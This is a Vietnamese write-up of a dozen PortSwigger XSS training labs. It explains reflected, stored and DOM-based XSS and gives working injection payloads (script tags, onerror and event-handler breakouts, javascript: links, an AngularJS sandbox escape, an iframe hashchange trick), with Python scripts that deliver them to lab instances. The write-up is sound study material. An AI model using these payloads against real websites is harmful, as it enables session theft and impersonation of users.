# Cross-site scripting (XSS)

## Khái niệm & Khai thác & Phòng tránh

- **Khái niệm**
  - là kỹ thuật tấn công bằng cách chèn vào các website những đoạn mã script nguy hiểm như javascript hoặc HTML. Thông thường, các cuộc tấn công XSS được thực thi ở phía client, vượt qua quyền kiểm soát truy cập, chiếm phiên đăng nhập và mạo danh người dùng.
  - Nếu như các kỹ thuật tấn công khác có thể làm thay đổi được dữ liệu nguồn của web server (source code, cấu trúc, Database) thì XSS chỉ gây tổn hại đối với website ở phía client nên sẽ gây hậu quả trực tiếp cho người dùng

![image](https://hackmd.io/_uploads/ByCKEmIq6.png)

- **Khai thác**
- Các bước khai thác:

  - Bước 1: Một nạn nhân truy cập vào một trang Web độc hại hoặc nhấn vào một liên kết không rõ ràng, sẽ bị nhúng mã JavaScript chứa phần mềm độc hại, sau đó sẽ kiểm soát trình duyệt của họ.
  - Bước 2: Mã độc JavaScript Malware sẽ tải một ứng dụng trên nền Java Applet và làm lộ ra địa chỉ IP của nạn nhân thông qua NAT IP.
  - Bước 3: Sau đó sử dụng trình duyệt của nạn nhân như một nền tảng để tấn công, mã độc JavaScript sẽ xác định máy chủ Web trên mạng nội bộ.
  - Bước 4: Phát động tấn công chống lại các Web nội bộ hoặc Web bên ngoài, thu thập thông tin đánh cắp được và gửi ra mạng bên ngoài.

- XSS nói chung được chia làm 3 loại chính là **Reflected, Stored và DOM based**.
  **1. STORED-XSS** - dạng tấn công mà hacker chèn trực tiếp các mã độc vào cơ sở dữ liệu của website. Dạng tấn công này xảy ra khi các dữ liệu được gửi lên server không được kiểm tra kỹ lưỡng mà lưu trực tiếp vào cơ sở dữ liệu. Khi người dùng truy cập vào trang web này thì những đoạn script độc hại sẽ được thực thi chung với quá trình load trang web. - ![image](https://hackmd.io/_uploads/HydRulLca.png)

- ![image](https://hackmd.io/_uploads/ByQBBX89a.png)

  **2. Reflected XSS** - hacker không gửi dữ liệu độc hại lên server nạn nhân, mà gửi trực tiếp link có chứa mã độc cho người dùng, khi người dùng click vào link này thì trang web sẽ được load chung với các đoạn script độc hại. Reflected XSS thường dùng để ăn cắp cookie, chiếm session,… của nạn nhân hoăc cài keylogger, trojan … vào máy tính nạn nhân. - Trước tiên, hacker sẽ gửi cho nạn nhân một đường link có chứa mã độc hại đi kèm, ví dụ:

```
http://victim.com/index.php?id=<script>alert(document.cookie)</script>
```

- Từ phía site của mình, hacker sẽ bắt được nội dung request trên và coi như session của người dùng sẽ bị chiếm. Đến lúc này, hacker có thể giả mạo với tư cách nạn nhân và thực hiện mọi quyền trên website mà nạn nhân có.

![image](https://hackmd.io/_uploads/HJ6ySX89p.png)

- **3. DOM Based XSS** - Chúng ta có thể hiểu đơn giản DOM giúp một trang web truy nhập, thay đổi nội dung một cách dynamic (động) phần source code trang web (HTML) từ đó thay đổi nội dung hiển thị, tùy vào từng thao tác người dùng hoặc cách hoạt động từ trang web. - DOM Based XSS là kỹ thuật khai thác XSS dựa trên việc thay đổi cấu trúc DOM của tài liệu, cụ thể là HTML.Và cũng có thể thấy kịch bản khai thác thực tế, DOM Based có phần giống với Reflected hơn là Stored XSS khi phải lừa người dùng truy cập vào một URL đã nhúng mã độc.
  - Và cũng để dễ hình dung, bạn có thể xem ví dụ ứng dụng có đoạn JavaScript đọc giá trị từ input field và sau đó ghi giá trị vào một thành phần của HTML như sau:

```
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
```

- Thông thường, input field sẽ được lấy từ các phần của HTTP request ví dụ như URL query string parameter do vậy attacker có thể tấn công bằng URL độc hại theo cùng phương thức với Reflected XSS.
- **Phòng tránh**
  - **Đối với người** dùng thì ta cần phải cân nhắc khi click vào link, kiểm tra các link thật kĩ trước khi click. Đặc biệt trên mạng xã hội. Cần cảnh giác trước khi click vào xem 1 link nào đó được chia sẻ.
  - **Đối với người thiết kế và phát triển ứng dụng web** Với những dữ liệu, thông tin nhập của người dùng, người thiết kế và phát triển ứng dụng web cần thực hiện vài bước cơ bản sau:
    - Liên tục kiểm tra và lọc dữ liệu
    - Tạo ra danh sách những thẻ HTML được phép sử dụng, xóa bỏ các thẻ `<script>` , coi đoạn script đó như là đoạn trích dẫn lỗi.
    - Vẫn cho phép nhập dữ liệu đặc biệt nhưng chúng sẽ đc mã hóa theo chuẩn riêng
    - Lọc White-List Filtering và Black-List Filtering
    - Input Encoding và Output Encoding
    - Sử dụng thư viện

## 1. Lab: Reflected XSS into HTML context with nothing encoded

link: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded

### Đề bài

![image](https://hackmd.io/_uploads/BkWIZmIc6.png)

### Phân tích

- Ứng dụng web có chức năng search và in chuỗi tìm kiếm ra giao diện.

![image](https://hackmd.io/_uploads/Hke7EVLqa.png)

- Kiểm tra mã nguồn HTML, có thể thấy, chuỗi tìm kiếm được truyền trực tiếp vào mà không có validate → reflected XSS.

![image](https://hackmd.io/_uploads/BygEVNI96.png)

### Khai thác

trong những bài lab này mình sẽ thử các payload từ payloadallthethings

![image](https://hackmd.io/_uploads/H15DE48cp.png)

và với payload này mình đã solve được bài lab

```javascript
<script>alert('XSS')</script>
```

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a4700800369fbdb81f5037f006400a5.web-security-academy.net'

response = requests.get(
    url + "/?search=<script>alert('XSS')</script>",
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/SygZU4U56.png)

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/SyHHU4Ica.png)

## 2. Lab: Stored XSS into HTML context with nothing encoded

link: https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded

### Đề bài

![image](https://hackmd.io/_uploads/SJ_tINUqT.png)

### Phân tích

- Lab này chứa lỗ hổng stored-XSS ở chức năng comment, để solve lab thì mình cần submit comment mà gọi ra chức năng alert khi xem blog post

- Khi ấn vào bên trong một blog post, thì dưới cùng sẽ là chỗ để ta bình luận, với các nội dung: Comment, tên, email, website

![image](https://hackmd.io/_uploads/HkOFPEIc6.png)

![image](https://hackmd.io/_uploads/HJ7jPELca.png)

mình bình luận và thấy web chỉ lọc tên người comment mà không lọc nội dung bình luân

### Khai thác

với payload này mình nhập vào phần comment và đã solve được bài lab

```javascript
<script>alert('XSS')</script>
```

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a9000f704a87a21878b88af00c6007f.web-security-academy.net'

session = requests.Session()

response = session.get(
    url + "/post?postId=8",
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
csrf = soup.find('input', {'name' : 'csrf'})['value']
data = {
    'comment': "<script>alert('XSS')</script>",
    'postId': '8',
    'name': 'cuong',
    'email': 'a@a.a',
    'website' : '',
    'csrf' : csrf,
}

response = session.post(
    url + "/post/comment",
    data=data,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/SJGK5NU96.png)

## 3. Lab: DOM XSS in document.write sink using source location.search

link: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink

### Đề bài

![image](https://hackmd.io/_uploads/SkZEi4Lca.png)

### Phân tích

- Lab này chứa lỗi DOM-based XSS ở chức năng tìm kiếm search query, nó sử dụng câu lệnh javascript document.write - nó sẽ đóng vai trò viết dữ liệu đầu ra cho trang web, chức năng `document.write` được gọi với dữ liệu lấy từ `location.search`, cái này ta có thể control sử dụng URL của trang web. Để solve lab thì ta cần thực hiện chức năng alert
- để xem chức năng hiện kết quả search sẽ như thế nào:

![image](https://hackmd.io/_uploads/B1Wc3EL9p.png)

![image](https://hackmd.io/_uploads/SJNQn4856.png)

chúng ta có thể thấy chuối `<'cuong'>` mình nhập vào đã bị filter các ký tự đặc biệt

- nhưng để ý ở phần script

```javascript
<script>
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        trackSearch(query);
    }
</script>
```

- chức năng `document.write` được gọi với dữ liệu lấy từ `location.search` và nó hiện dữ liệu ra giao diện thông qua chuỗi search chúng ta nhập vào
- Đoạn script này cho ta thấy cách xử lý khi ta search một đoạn ký tự, đầu tiên biến query sẽ lấy cái ta search trên URL bằng URLSearchParams, ở đây /?search= thì giá trị của biến query chính là “a”. Nếu tồn tại query thì ta sẽ thực hiện hàm trackSearch, nơi mà nó sẽ tạo một thẻ `<img>` ở tracker.gif với từ khóa tìm kiếm là giờ sẽ trở thành một phần của URL của hình ảnh
- mình sẽ tìm cách để kết thúc đoạn tạo thẻ `<img>`, rồi chèn thẻ script vào để thực thi, payload tìm kiếm của em sẽ là:`"><script>alert('XSS')</script>`, ở đây thì dấu > đầu tiên sẽ kết thúc chuỗi tạo thẻ <img>, sau đó em thực thi lệnh js với thẻ script, cuối cùng là câu lệnh này sẽ viết ra "> vì nó là phần cuối của đoạn code nếu em inject vào. Để cụ thể hơn thì khi mình tìm kiếm với payload trên, câu lệnh document.write sẽ có dạng:

```javascript
document.write(<img src="/resources/images/tracker.gif?searchTerms="><script>alert('XSS')</script>">');
```

### Khai thác

- vậy ta chỉ cần nhập payload vào search nó cũng sẽ được hiện ra như bài 1 mà phần xử lý trong DOM không bị filter
- với payload này mình nhập vào phần search và đã solve được bài lab

```javascript
"><script>alert('XSS')</script>
```

và mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0afa009f04b659d480e512f7005b0068.web-security-academy.net'

response = requests.get(
    url + "/?search=\"><script>alert('XSS')</script>",
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/SyrJZr89T.png)

## 4. Lab: DOM XSS in innerHTML sink using source location.search

link: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink

### Phân tích

- Lab này chứa lỗ hổng DOM-based XSS ở chức năng tìm kiếm blog, nó sử dụng thuộc tính innerHTML, thứ sẽ thay đổi nội dung HTML ở trong thẻ `<div>`, sử dụng dữ liệu từ location.search. Để solve lab thì mình cần thực hiện được câu lệnh alert().

![image](https://hackmd.io/_uploads/ryyefH89T.png)

![image](https://hackmd.io/_uploads/r15XMHI96.png)

```javascript
<script>
    function doSearchQuery(query) {
        document.getElementById('searchMessage').innerHTML = query;
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        doSearchQuery(query);
    }
</script>
```

- Đoạn script này sẽ lấy giá trị của tham số search trên URL đưa vào biến query, sau đó nó sẽ tìm thẻ nào có phần id=‘searchMessage’, sau đó gán nội dung HTML của thẻ đó bằng giá trị của biến query, cho phép hiển thị kết quả của truy vấn tìm kiếm lên trang web.
- Vậy là thứ mình cần khai thác là phần giá trị của tham số search trên URL, vì giá trị này sẽ được gán vào query sau đó được thực hiện bằng innerHTML

### Khai thác

- mình sẽ sử dụng payload là: `<img src=1 onerror=alert('XSS')>` vì innerHTML không hỗ trợ thẻ script, khi đó đầy đủ câu lệnh sẽ là:

```javascript
document.getElementById('searchMessage').innerHTML = <img src=1 onerror=alert('XSS')>
```

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a39005903920e0681b066f00003004a.web-security-academy.net'

response = requests.get(
    url + "/?search=<img src=1 onerror=alert('XSS')>",
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/Skh2XHU9p.png)

## 5. Lab: DOM XSS in jQuery anchor href attribute sink using location.search source

link: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink

### Đề bài

![image](https://hackmd.io/_uploads/BkFr4SI56.png)

### Phân tích

- Lab này có chứa lỗ hổng DOM-based XSS ở trang submit feedback. Nó sử dụng chức năng lựa chọn `$` của thư viện jQuery để tìm một thẻ `<a>` và đổi thuộc tính href sử dụng dữ liệu từ location.search. Để solve lab này thì mình cần đưa link "back" hiện ra `document.cookie`

Tại form submit feedback, trang web có chứa chức năng Back để quay lại trang trước.

![image](https://hackmd.io/_uploads/S1vHrr8qT.png)

![image](https://hackmd.io/_uploads/BJh8BB8qT.png)

- đoạn code này sẽ đi tìm một thẻ `<a>` có id=backLink, sau đó nó sẽ thay đổi thuộc tính “href” của thẻ đó bằng giá trị của tham số returnPath trên URL

### Khai thác

- Như vậy ta sẽ send request đến `/feedback?returnPath=javascript:alert('XSS')` để khi click vào Back, hàm alert trong `href="javascript:alert('XSS')"` được thực thi.

và mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a920094037e2c05818c7abe0091002c.web-security-academy.net'

response = requests.get(
    url + "/feedback?returnPath=javascript:alert('XSS')",
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/H1ybDH896.png)

## 6. Lab: DOM XSS in jQuery selector sink using a hashchange event

link: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event

### Đề bài

![image](https://hackmd.io/_uploads/ryOnqrU9p.png)

### Phân tích

- Lab này có chứa lỗ hổng DOM-based XSS ở trang chủ. Nó sử dụng chức năng chọn $() của jQuery để tự động lăn chuột đến một post cho trước, tiêu đề của nó được truyền qua location.hash. Để solve lab này, mình cần phải truyền cho nạn nhân một trang web sao cho nó gọi được chức năng print() ở máy nạn nhân

![image](https://hackmd.io/_uploads/Sy8VjSUc6.png)

- Đọc HTML source code thì có 1 đoạn script JQuery sử dụng selector $() thực hiện auto-scroll người dùng đến bài post có chứa chuỗi hash (lấy từ source location.hash) do người dùng nhập vào với prefix #. Nó sẽ được thực thi khi event hashchange được kích hoạt.
  - `window.location.hash` sẽ trả về phần sau của dấu # của URL, bao gồm cả dấu #. Nên slice(1) là để bỏ dấu # đi và chỉ lấy chuỗi đằng sau dấu `#`
  - Sau đó hàm `decodeURIComponent` sẽ giải mã các ký tự đặc biệt có trong chuỗi vừa lấy
  - Chọn ra thẻ `<h2>` trong phần phần tử section có class là blog-list và chứa nội dung giống với chuỗi ta vừa giải mã
  - Nếu có tồn tại thì tự động lăn đến chỗ tiêu đề thỏa mãn điều kiện trên

![image](https://hackmd.io/_uploads/S1Jg6HUqp.png)

### Khai thác

Có thể thấy, ta hoàn toàn có thể inject 1 XSS vector thông qua location.hash. Tuy nhiên, ta cần xác định phương thức để kích hoạt hashchange event mà không cần có tương tác của người dùng. Cách đơn giản nhất là sử dụng iframe kiểu như sau:

```javascript
<iframe
  src="https://0a26008303211a408060c68a000c003e.web-security-academy.net/#"
  onload="this.src+='<img src=1 onerror=print()>'"
></iframe>
```

- Khi iframe được load, XSS payload <img src=1 onerror=print()> sẽ được gắn vào hash và khiến cho hashchange event được kích hoạt.

- Vậy là ta phải khai thác vào sau dấu # của URL, ta tiến hành vào exploit server để tạo trang khai thác

![image](https://hackmd.io/_uploads/SyuwJUU56.png)

store và gửi cho victim

![image](https://hackmd.io/_uploads/rJXwyIL9T.png)

## 7. Lab: Reflected XSS into attribute with angle brackets HTML-encoded

link: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded

### Đề bài

![image](https://hackmd.io/_uploads/BJMhyKL5a.png)

### Phân tích

- Lab này chứa lỗ hổng DOM-based XSS ở biểu thức AngularJS trong chức năng tìm kiếm. AngularJS là một thư viện javascript phổ biến, nó sẽ quét lấy nội dung của HTML nodes chứa thuộc tính ng-app (câu lệnh chỉ thị của AngularJS). Khi chị thỉ được thêm vào code HTML, ta có thể thực thi biểu thức javascript ở trong 2 dấu ngoặc nhọn: {{}}. Kĩ thuật này rất hữu ích khi dấu `<>` bị mã hóa. Để solve này thì mình cần phải thực thi tấn công XSS và thực thi câu lệnh `alert`

![image](https://hackmd.io/_uploads/rkr9WtU9a.png)

![image](https://hackmd.io/_uploads/BJaMQtIcp.png)

các ký tự đặc biệt đã bị encode và để ý chuỗi search của chúng ta được đưa vào attribute value trong thẻ input và chúng ta cần bypass nó và inject câu lệnh thực thi javascript

### Khai thác

![image](https://hackmd.io/_uploads/HJUndtL9p.png)

![image](https://hackmd.io/_uploads/ryDjuF85a.png)

mình thử payload `"onfocus="alert(1)` đã khai thác được XSS trên máy mình nhưng chưa giải quyết được bài lab và như đề bài đã gợi ý mình khai thác được trên máy mình nhưng chưa chắc đã thành công trên máy victim và mình cần tìm 1 handle khác để kích hoạt `alert`

![image](https://hackmd.io/_uploads/S1CtYYI96.png)

- và mình cần thử các event mà Portswigger cung cấp
- mình đưa vào intruder và thử

![image](https://hackmd.io/_uploads/SyLnjF89a.png)

![image](https://hackmd.io/_uploads/BJpjhK85p.png)

và để ý khi chạy đến ==onmouseover== lab đã được giải quyết

![image](https://hackmd.io/_uploads/rJ6M2YL56.png)

- sử dụng payload `"onmouseover="alert(1)`

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a5d00ee036d726a806a12af009f006e.web-security-academy.net'

payload = "\"onmouseover=\"alert(1)"
response = requests.get(
    url + "/?search=" + payload ,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

mục đích của chúng ta đã hoàn thành và mình cũng dã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/HyXL8tIca.png)

## 8. Stored XSS into anchor href attribute with double quotes HTML-encoded

link: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded

### Đề bài

![image](https://hackmd.io/_uploads/Bk6hDt8ca.png)

### Phân tích

- Lab này chứa lỗ hổng stored XSS ở chức năng comment, để solve lab thì mình cần comment mà thực hiện được lệnh alert mỗi khi click vào tên của người comment.

- mình đã thử post comment không có website, thì mình XSS ở chức năng comment nhưng không được, nên minhg đã thêm vào website là `a.com` và khi nộp comment ta thấy được trang web được đưa vào thuộc tính href:

![image](https://hackmd.io/_uploads/rkVe1qI9T.png)

### Khai thác

- Chỉ cần website là `javascript:alert(1)`,

![image](https://hackmd.io/_uploads/rygGN9U5p.png)

Lúc này chi victim click vào tên của chúng ta sẽ xuất hiện alert và thành công solve được challenge.

![image](https://hackmd.io/_uploads/ryrcEqI56.png)

và mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a890075035ce34080811823000e0068.web-security-academy.net/'

session = requests.Session()
response = session.get(
    url + 'post?postId=8' ,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
csrf = soup.find('input' , {'name' : 'csrf'})['value']
payload = "javascript:alert(1)"

data = {
    'csrf' : csrf,
    'postId' : '8',
    'comment' : 'cuong',
    'name' : 'cuong',
    'email' : 'a@a.a',
    'website' : payload,
}
response = session.post(
    url + "post/comment",
    data=data,
    verify=False,
)

response = session.get(
    url + 'post?postId=8' ,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/HJm0rqIqa.png)

![image](https://hackmd.io/_uploads/rJQm4qU56.png)

## 9. Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

link: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded

### Đề bài

![image](https://hackmd.io/_uploads/S1k5VMw9T.png)

### Phân tích

- Lab trên chứa lỗ hổng reflected XSS ở chức năng tìm kiếm, nó hiện ra dữ liệu ở trong dòng javascript với dấu ' và \ bị thay thế, để solve lab thì mình cần làm cách nào thể ra khỏi đoạn string js và thực hiện chức năng alert

mình search chuỗi `<'\"cuong` thì các ký tự đặc biệt đã được mã hóa nhưng có vẻ dấu `"` , `\` và `'` của mình vẫn được hiện ra bình thường

![image](https://hackmd.io/_uploads/r1sJ8Mwqp.png)

![image](https://hackmd.io/_uploads/SkbyLzDqa.png)

```javascript
 <script>
     var searchTerms = '&lt;'\"cuong';
     document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

chuỗi người dùng search sẽ được lưu vào biến searchTerms.

### Khai thác

- Lúc này ta có thể escape searchTerms và gọi hàm alert bằng payload `cuong';alert(1);//`. Có thể thấy đoạn script được render sau khi ta inject vẫn đúng cấu trúc của Javascript.

![image](https://hackmd.io/_uploads/BJEVtzv5T.png)

và mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a30005b04f0933483945fa300ac00e8.web-security-academy.net'

session = requests.Session()

payload = "cuong';alert(1);//"
response = session.get(
    url + '/?search=' + payload,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/Sk6yKfw5p.png)

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/SyZ0uGw9a.png)

## 10. Lab: DOM XSS in document.write sink using source location.search inside a select element

link: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element

### Đề bài

![image](https://hackmd.io/_uploads/B1v5Kfv56.png)

### Phân tích

- Lab này chứa lỗ hổng DOM-based XSS ở chức năng check hàng hóa, chức năng này sử dụng hàm `document.write` trong javascript, nó sẽ viết dữ liệu đầu ra cho trang web. Chức năng này lấy dữ liệu từ location.search, nơi mà ta có thể control sử dụng URL, data được đính kèm theo với 1 element. Để solve lab thì mình cần thực hiện được câu lệnh alert().

![image](https://hackmd.io/_uploads/HyWr5zPcT.png)

CTRL+U mình được đoạn code xử lý javascript

```javascript
 <script>
        var stores = ["London","Paris","Milan"];
        var store = (new URLSearchParams(window.location.search)).get('storeId');
        document.write('<select name="storeId">');
        if(store) {
            document.write('<option selected>'+store+'</option>');
        }
        for(var i=0;i<stores.length;i++) {
            if(stores[i] === store) {
            continue;
            }
            document.write('<option>'+stores[i]+'</option>');
         }
        document.write('</select>');
</script>
```

- Chức năng của đoạn code này sẽ như sau:
  - Đầu tiên nó tạo một mảng stores gồm 3 phần tử `“London”,“Paris”,“Milan”`, sau đó tạo biến store để lấy storeId(tên của store) ở trên URL
  - Sau đó tạo một thẻ `<select>` với giá trị là storeId, rồi nếu store đó có giá trị thì thực thi câu lệnh tiếp theo sẽ tạo ra một thẻ `<option>` với thuộc tính selected để thông báo rằng option đã được chọn, và nội dung là giá trị của biến store.
  - Tiếp đến vòng for dưới để hiện ra các thẻ `<option>` khác trong mảng stores, nếu phần tử nhập vào giống với 1 trong các phần tử của mảng thì sẽ bỏ qua và di chuyển sang phần tử tiếp theo.
  - Cuối cùng thì tạo ra thẻ `<select>` để chọn. Sau khi thực hiện đoạn mã này, trang web sẽ hiển thị 1 danh sách thả xuống để cho ta lựa chọn, nếu URL được truyền vào tham số storeId thì các tùy chọn trên sẽ được thực hiện

`var store = (new URLSearchParams(window.location.search)).get('storeId')`
cho chúng ta thấy giá trị của biến store là giá trị của tham số storeId mà giá trị này chúng ta có thể kiểm soát được sau đó kiểm tra đều kiện và render ra `document.write('<option selected>'+store+'</option>');`

### Khai thác

vì `var store = (new URLSearchParams(window.location.search)).get('storeId')` lấy storeId lấy từ phương thức GET nên mình sẽ request đến `https://0a00003c03f9fd93802a1258004c0045.web-security-academy.net/product?productId=1&storeId=%27%3Cscript%3Ealert(%27XSS%27)%3C/script%3E`
để chuyền vào storeId payload `<script>alert('XSS')</script>`
![image](https://hackmd.io/_uploads/HJOJrmw9a.png)

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a00003c03f9fd93802a1258004c0045.web-security-academy.net'

session = requests.Session()

payload = "<script>alert('XSS')</script>"

response = session.get(
    url + '/product?productId=1&storeId=' + payload,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/Hyc8rmP9p.png)

## 11. Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

link: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression

### Đề bài

![image](https://hackmd.io/_uploads/HJ4oIQvqp.png)

### Phân tích

- Lab này chứa lỗ hổng DOM-based XSS ở biểu thức AngularJS trong chức năng tìm kiếm. AngularJS là một thư viện javascript phổ biến, nó sẽ quét lấy nội dung của HTML nodes chứa thuộc tính ng-app (câu lệnh chỉ thị của AngularJS). Khi chị thỉ được thêm vào code HTML, ta có thể thực thi biểu thức javascript ở trong 2 dấu ngoặc nhọn: {{}}. Kĩ thuật này rất hữu ích khi dấu <> bị mã hóa. Để solve này thì mình cần phải thực thi tấn công XSS và thực thi câu lệnh alert
- mình đã tìm kiếm cách sử dụng hàm nào để bypass và thực hiện câu lệnh JS, và em đã tìm thấy thứ này ở PayLoadAllTheThing

![image](https://hackmd.io/_uploads/BJ54w7DqT.png)

### Khai thác

- Sử dụng payload này, trang web đã bị XSS thành công: `{{constructor.constructor('alert(1)')()}}`

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a31000703cbf17984de50bd00f400a8.web-security-academy.net'

session = requests.Session()

payload = "{{constructor.constructor('alert(1)')()}}"

response = session.get(
    url + '/?search=' + payload,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
```

mục đích của chúng ta đã hoàn thành và mình đã giải quyết được lab này

![image](https://hackmd.io/_uploads/BJqk_XP9T.png)

## 12. Lab: Reflected DOM XSS

link: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected

### Đề bài

![image](https://hackmd.io/_uploads/HkxOA_7P5a.png)

### Phân tích

- Lab trên đưa ra một minh chứng cho lỗ hổng reflected DOM XSS. Lỗi này xảy ra khi phía server xử lý dữ liệu từ một request và hiện ra lập tực dữ liệu ở trong response. Có một script ở trang web mà xử lý dữ liệu của data vừa nhập một cách không an toàn, từ đó làm trang web đối diện với nguy cơ bị tấn công cao. Để solve lab thì mình sẽ thực hiện chức năng alert() ở trang web
- mình hiện tính năng search của trang web

![image](https://hackmd.io/_uploads/H1qejQP5T.png)

có hàm search và chuyền vào tham số search-results

![image](https://hackmd.io/_uploads/rJ2u5mv5a.png)

Có tận 2 trang xử lý kết quả,

Đi vào đoạn src code js xử lý để phân tích xem sao: `/resources/js/searchResults.js`

![image](https://hackmd.io/_uploads/rykPi7P56.png)

```javascript
function search(path) {
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function () {
    if (this.readyState == 4 && this.status == 200) {
      eval("var searchResultsObj = " + this.responseText);
      displaySearchResults(searchResultsObj);
    }
  };
  xhr.open("GET", path + window.location.search);
  xhr.send();

  function displaySearchResults(searchResultsObj) {
    var blogHeader = document.getElementsByClassName("blog-header")[0];
    var blogList = document.getElementsByClassName("blog-list")[0];
    var searchTerm = searchResultsObj.searchTerm;
    var searchResults = searchResultsObj.results;

    var h1 = document.createElement("h1");
    h1.innerText =
      searchResults.length + " search results for '" + searchTerm + "'";
    blogHeader.appendChild(h1);
    var hr = document.createElement("hr");
    blogHeader.appendChild(hr);

    for (var i = 0; i < searchResults.length; ++i) {
      var searchResult = searchResults[i];
      if (searchResult.id) {
        var blogLink = document.createElement("a");
        blogLink.setAttribute("href", "/post?postId=" + searchResult.id);

        if (searchResult.headerImage) {
          var headerImage = document.createElement("img");
          headerImage.setAttribute("src", "/image/" + searchResult.headerImage);
          blogLink.appendChild(headerImage);
        }

        blogList.appendChild(blogLink);
      }

      blogList.innerHTML += "<br/>";

      if (searchResult.title) {
        var title = document.createElement("h2");
        title.innerText = searchResult.title;
        blogList.appendChild(title);
      }

      if (searchResult.summary) {
        var summary = document.createElement("p");
        summary.innerText = searchResult.summary;
        blogList.appendChild(summary);
      }

      if (searchResult.id) {
        var viewPostButton = document.createElement("a");
        viewPostButton.setAttribute("class", "button is-small");
        viewPostButton.setAttribute("href", "/post?postId=" + searchResult.id);
        viewPostButton.innerText = "View post";
      }
    }

    var linkback = document.createElement("div");
    linkback.setAttribute("class", "is-linkback");
    var backToBlog = document.createElement("a");
    backToBlog.setAttribute("href", "/");
    backToBlog.innerText = "Back to Blog";
    linkback.appendChild(backToBlog);
    blogList.appendChild(linkback);
  }
}
```

